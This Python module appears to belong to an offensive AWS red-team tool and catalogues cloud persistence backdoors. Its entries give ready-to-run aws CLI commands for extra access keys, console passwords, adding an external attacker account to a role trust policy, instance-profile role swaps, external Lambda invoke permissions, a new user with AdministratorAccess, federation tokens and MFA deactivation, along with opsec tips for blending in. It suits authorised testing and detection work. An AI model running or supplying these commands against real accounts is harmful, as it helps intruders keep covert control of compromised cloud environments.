"""Persistence & backdoor edges: durable access that survives the compromised
principal being remediated. Access keys, console profiles, role-trust
backdoors, instance-profile swaps, Lambda resource-policy backdoors, federation
tokens, MFA removal.

These are the AWS analogues of AD persistence (golden tickets, DCSync creds):
you already have access; the goal is to keep it.
"""

from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform

ABUSE_DB: dict[str, AbuseInfo] = {}


def _s(desc, cmd, api="", blast=BlastRadius.MUTATE, tool="aws", opsec="") -> AbuseStep:
    return AbuseStep(
        description=desc,
        command=cmd,
        platform=Platform.LINUX,
        tool=tool,
        blast_radius=blast,
        api=api,
        opsec_note=opsec,
    )


# ─── BackdoorAccessKey ──────────────────────────────────────────────────────

ABUSE_DB["BackdoorAccessKey"] = AbuseInfo(
    edge_kind="BackdoorAccessKey",
    description=(
        "Create a second access key on a privileged user you already control (or "
        "can reach) so you retain programmatic access even if your original "
        "credentials are rotated. Persistence flavour of CreateAccessKey."
    ),
    required_permissions=["iam:CreateAccessKey"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "A user is capped at 2 access keys; a second key on a normally "
        "single-key service account is an obvious IOC. GuardDuty flags this "
        "under Persistence:IAMUser/*."
    ),
    linux_steps=[
        _s(
            "Mint a persistence key",
            "aws iam create-access-key {AWS_AUTH} --user-name '{TARGET_NAME}'",
            api="iam:CreateAccessKey",
        ),
        AbuseStep(
            description="Cleanup: delete the persistence key",
            command="aws iam delete-access-key {AWS_AUTH} --user-name '{TARGET_NAME}' --access-key-id '{NEW_ACCESS_KEY}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteAccessKey",
            is_cleanup=True,
        ),
    ],
)


# ─── BackdoorLoginProfile ───────────────────────────────────────────────────

ABUSE_DB["BackdoorLoginProfile"] = AbuseInfo(
    edge_kind="BackdoorLoginProfile",
    description=(
        "Add a console password to a privileged user for interactive "
        "persistence. Persistence flavour of CreateLoginProfile."
    ),
    required_permissions=["iam:CreateLoginProfile"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Console persistence needs MFA on the account bypassed or absent to be reliable.",
    linux_steps=[
        _s(
            "Set a console password for persistence",
            "aws iam create-login-profile {AWS_AUTH} --user-name '{TARGET_NAME}' --password '{NEW_PASSWORD}' --no-password-reset-required",
            api="iam:CreateLoginProfile",
        ),
        AbuseStep(
            description="Cleanup: remove the login profile",
            command="aws iam delete-login-profile {AWS_AUTH} --user-name '{TARGET_NAME}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteLoginProfile",
            is_cleanup=True,
        ),
    ],
)


# ─── RoleTrustBackdoor ──────────────────────────────────────────────────────

ABUSE_DB["RoleTrustBackdoor"] = AbuseInfo(
    edge_kind="RoleTrustBackdoor",
    description=(
        "Add an EXTERNAL account (yours) to a role's trust policy so you can "
        "assume it cross-account indefinitely, independent of any credential in "
        "the target account. The most durable AWS backdoor there is."
    ),
    required_permissions=["iam:UpdateAssumeRolePolicy"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMRole"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations=(
        "Introduces a cross-account trust that Access Analyzer will flag as an "
        "external principal. UpdateAssumeRolePolicy OVERWRITES - merge your "
        "principal INTO the existing trust document rather than replacing it, "
        "and keep the original for rollback. Requires --allow-external and an "
        "explicit attacker account."
    ),
    linux_steps=[
        _s(
            "Capture the current trust policy",
            "aws iam get-role {AWS_AUTH} --role-name '{ROLE_NAME}' --query 'Role.AssumeRolePolicyDocument'",
            api="iam:GetRole",
            blast=BlastRadius.READ,
        ),
        _s(
            "Rewrite the trust to ALSO allow your account (merge, do not clobber)",
            "aws iam update-assume-role-policy {AWS_AUTH} \\\n"
            "  --role-name '{ROLE_NAME}' \\\n"
            "  --policy-document '{MERGED_TRUST_POLICY}'",
            api="iam:UpdateAssumeRolePolicy",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: restore the original trust policy",
            command="aws iam update-assume-role-policy {AWS_AUTH} --role-name '{ROLE_NAME}' --policy-document '{ORIGINAL_TRUST_POLICY}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="iam:UpdateAssumeRolePolicy",
            is_cleanup=True,
        ),
    ],
)


# ─── AddRoleToInstanceProfile ───────────────────────────────────────────────

ABUSE_DB["AddRoleToInstanceProfile"] = AbuseInfo(
    edge_kind="AddRoleToInstanceProfile",
    description=(
        "iam:AddRoleToInstanceProfile (after RemoveRole) swaps the role bound "
        "to an instance profile. An instance using that profile silently begins "
        "running as your chosen role - persistence tied to compute."
    ),
    required_permissions=[
        "iam:RemoveRoleFromInstanceProfile",
        "iam:AddRoleToInstanceProfile",
        "iam:PassRole",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["InstanceProfile"],
    blast_radius=BlastRadius.DESTRUCTIVE,
    opsec_considerations=(
        "An instance profile holds exactly one role; swapping it removes the "
        "legitimate role, which is destructive and can break the workload. "
        "Capture the original role name for rollback."
    ),
    linux_steps=[
        _s(
            "Remove the current role and add your privileged one",
            "aws iam remove-role-from-instance-profile {AWS_AUTH} --instance-profile-name '{INSTANCE_PROFILE_NAME}' --role-name '{ORIGINAL_ROLE}'\n"
            "aws iam add-role-to-instance-profile {AWS_AUTH} --instance-profile-name '{INSTANCE_PROFILE_NAME}' --role-name '{ROLE_NAME}'",
            api="iam:AddRoleToInstanceProfile",
            blast=BlastRadius.DESTRUCTIVE,
        ),
        AbuseStep(
            description="Cleanup: restore the original role binding",
            command="aws iam remove-role-from-instance-profile {AWS_AUTH} --instance-profile-name '{INSTANCE_PROFILE_NAME}' --role-name '{ROLE_NAME}'\n"
            "aws iam add-role-to-instance-profile {AWS_AUTH} --instance-profile-name '{INSTANCE_PROFILE_NAME}' --role-name '{ORIGINAL_ROLE}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.DESTRUCTIVE,
            api="iam:AddRoleToInstanceProfile",
            is_cleanup=True,
        ),
    ],
)


# ─── LambdaAddPermissionBackdoor ────────────────────────────────────────────

ABUSE_DB["LambdaAddPermissionBackdoor"] = AbuseInfo(
    edge_kind="LambdaAddPermissionBackdoor",
    description=(
        "lambda:AddPermission grafts a resource-policy statement onto a "
        "function allowing an external principal to invoke it. Combined with a "
        "function that acts privileged, this is durable cross-account access."
    ),
    required_permissions=["lambda:AddPermission"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["LambdaFunction"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations="Adds an external-invoke statement Access Analyzer will surface. Cleanly reversible via RemovePermission.",
    linux_steps=[
        _s(
            "Allow your external account to invoke the function",
            "aws lambda add-permission {AWS_AUTH} \\\n"
            "  --function-name '{FUNCTION_NAME}' \\\n"
            "  --statement-id awspwn --action lambda:InvokeFunction \\\n"
            "  --principal '{ATTACKER_ACCOUNT}'",
            api="lambda:AddPermission",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: remove the resource-policy statement",
            command="aws lambda remove-permission {AWS_AUTH} --function-name '{FUNCTION_NAME}' --statement-id awspwn",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="lambda:RemovePermission",
            is_cleanup=True,
        ),
    ],
)


# ─── CreateBackdoorUser ─────────────────────────────────────────────────────

ABUSE_DB["CreateBackdoorUser"] = AbuseInfo(
    edge_kind="CreateBackdoorUser",
    description=(
        "iam:CreateUser + attach a policy + create keys builds a brand-new "
        "principal you own. Survives remediation of the account you originally "
        "compromised, unless someone notices the new user."
    ),
    required_permissions=[
        "iam:CreateUser",
        "iam:AttachUserPolicy",
        "iam:CreateAccessKey",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["AWSAccount"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="A new IAM user is a durable, obvious artifact. Name it to blend in; delete in cleanup.",
    linux_steps=[
        _s(
            "Create the user, grant admin, mint keys",
            "aws iam create-user {AWS_AUTH} --user-name '{NEW_USER}'\n"
            "aws iam attach-user-policy {AWS_AUTH} --user-name '{NEW_USER}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
            "aws iam create-access-key {AWS_AUTH} --user-name '{NEW_USER}'",
            api="iam:CreateUser",
        ),
        AbuseStep(
            description="Cleanup: detach policy, delete keys, delete user",
            command="aws iam detach-user-policy {AWS_AUTH} --user-name '{NEW_USER}' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
            "aws iam delete-access-key {AWS_AUTH} --user-name '{NEW_USER}' --access-key-id '{NEW_ACCESS_KEY}'\n"
            "aws iam delete-user {AWS_AUTH} --user-name '{NEW_USER}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="iam:DeleteUser",
            is_cleanup=True,
        ),
    ],
)


# ─── STSGetFederationToken ──────────────────────────────────────────────────

ABUSE_DB["STSGetFederationToken"] = AbuseInfo(
    edge_kind="STSGetFederationToken",
    description=(
        "sts:GetFederationToken issues a federated session bounded by your own "
        "permissions. Useful to spawn scoped, hard-to-attribute sessions and "
        "to generate console sign-in links from CLI credentials."
    ),
    required_permissions=["sts:GetFederationToken"],
    source_kinds=["IAMUser"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Only works from IAM-user credentials (not from an assumed role). The "
        "federated session inherits the intersection of your policy and the "
        "passed policy - cannot exceed what you already have."
    ),
    linux_steps=[
        _s(
            "Issue a federation token",
            "aws sts get-federation-token {AWS_AUTH} \\\n"
            "  --name '{SESSION_NAME}' \\\n"
            '  --policy \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
            api="sts:GetFederationToken",
            blast=BlastRadius.READ,
        ),
    ],
)


# ─── DeactivateMFA ──────────────────────────────────────────────────────────

ABUSE_DB["DeactivateMFA"] = AbuseInfo(
    edge_kind="DeactivateMFA",
    description=(
        "iam:DeactivateMFADevice removes an MFA device from a user, weakening "
        "authentication so a stolen password or key is sufficient on its own."
    ),
    required_permissions=["iam:DeactivateMFADevice"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["IAMUser"],
    blast_radius=BlastRadius.DESTRUCTIVE,
    opsec_considerations=(
        "Removing a user's MFA is loud and directly weakens their security "
        "posture - high-signal and hard to justify on most engagements. "
        "Re-enrolling the exact original device is not possible."
    ),
    linux_steps=[
        _s(
            "Deactivate the user's MFA device",
            "aws iam deactivate-mfa-device {AWS_AUTH} --user-name '{TARGET_NAME}' --serial-number '{MFA_SERIAL}'",
            api="iam:DeactivateMFADevice",
            blast=BlastRadius.DESTRUCTIVE,
        ),
    ],
)
